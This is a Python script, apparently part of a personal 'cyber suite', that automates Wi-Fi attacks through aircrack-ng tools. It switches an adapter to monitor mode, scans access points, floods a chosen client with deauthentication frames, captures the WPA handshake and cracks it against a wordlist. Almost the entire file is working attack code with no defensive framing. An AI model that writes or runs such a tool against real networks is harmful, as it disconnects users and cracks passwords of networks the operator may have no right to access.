import subprocess
import os

# --- Adapter Detection ---
def find_adapter():
    try:
        result = subprocess.check_output(["iwconfig"]).decode()
        for line in result.splitlines():
            if "IEEE 802.11" in line:
                return line.split()[0].strip()
    except Exception as e:
        print(f"Adapter detection error: {e}")
    return None

# --- Monitor Mode Management ---
def start_monitor_mode(interface):
    print(f"🛠️ Starting monitor mode on: {interface}")
    subprocess.call(["sudo", "airmon-ng", "check", "kill"])
    subprocess.call(["sudo", "airmon-ng", "start", interface])

def stop_monitor_mode(interface):
    monitor_iface = interface + "mon"
    print(f"🛠️ Stopping monitor mode on: {monitor_iface}")
    subprocess.call(["sudo", "airmon-ng", "stop", monitor_iface])
    subprocess.call(["sudo", "service", "NetworkManager", "start"])
    subprocess.call(["sudo", "service", "wpa_supplicant", "start"])

# --- WiFi MITM Attacks ---
def scan_wifi(interface):
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo airodump-ng {interface}"
    ])

def deauth_attack(interface, bssid, target_mac, channel):
    subprocess.call(["sudo", "iwconfig", interface, "channel", channel])
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo aireplay-ng --deauth 500 -a {bssid} -c {target_mac} {interface}"
    ])

def capture_handshake(interface, bssid, channel):
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo airodump-ng --bssid {bssid} -c {channel} -w handshake {interface}"
    ])

def crack_handshake(wordlist, cap_file):
    if wordlist and cap_file:
        try:
            wordlist_path = f"/home/bhaskar/wordlists/{wordlist}"
            cap_file_path = f"/home/bhaskar/cyber_suite/{cap_file}"

            subprocess.Popen([
                "xterm", "-hold", "-e",
                f"sudo aircrack-ng -w {wordlist_path} {cap_file_path}"
            ])
        except Exception as e:
            print(f"❌ Error cracking: {e}")
    else:
        print("❗ Please fill both wordlist and cap file fields!")
